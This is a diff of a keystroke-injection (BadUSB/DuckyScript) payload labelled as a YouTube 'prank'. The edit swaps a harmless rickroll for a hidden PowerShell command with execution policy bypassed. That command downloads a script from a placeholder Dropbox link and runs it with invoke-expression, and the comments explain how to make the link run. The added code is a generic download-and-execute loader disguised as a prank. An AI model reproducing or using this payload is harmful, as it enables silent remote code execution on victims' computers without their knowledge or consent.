@@ -1,6 +1,6 @@
 REM ######################################################
 REM #                                                    |
-REM # Title        : Iniciate a YouTube Video            |
+REM # Title        : YouTube-TripWire                    |
 REM # Author       : Meepmaster360                       |
 REM # Version      : 1.0                                 |
 REM # Category     : Prank                               |
@@ -10,10 +10,9 @@ REM # Date         : 25/3/2024                           |
 REM #                                                    |
 REM ######################################################
 
-
 REM Requirements:
 REM     - Internet Connection
-REM     - Chrome Instaled
+REM     - powershell Instaled
 REM     - 
 
 REM Layout Portuguese Keys
@@ -21,16 +20,13 @@ REM Chose The Correct Layout:
 REM LOCALE 
 LOCALE PT
 
-REM Initiate a Youtube Video
-REM Basically it enters chrome and rickrolls with no ads
+REM Description: Plays any YouTube video after a mouse movement is detected
 
-GUI
-DELAY 2000
-STRING Chrome
-DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
 ENTER
-DELAY 2000
-ALT d
-DELAY 2000
-STRING https://www.youtube.com/watch?v=xvFZjo5PgG0
-ENTER
+
+REM Remember to replace the link with your DropBox shared link for the intended file to download
+REM Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
